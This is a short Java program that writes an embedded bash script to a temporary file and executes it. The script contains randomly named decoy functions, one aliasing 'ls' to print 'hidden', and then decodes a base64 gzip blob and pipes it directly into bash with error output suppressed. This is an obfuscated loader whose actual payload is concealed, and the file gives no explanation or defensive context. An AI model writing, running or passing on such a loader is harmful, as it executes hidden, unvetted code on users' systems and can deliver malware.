import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

vi8gr359i() { echo $((RANDOM * RANDOM)); }
vda1b8n93() { for i in {1..3}; do :; done; }
viv8pjcjq() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
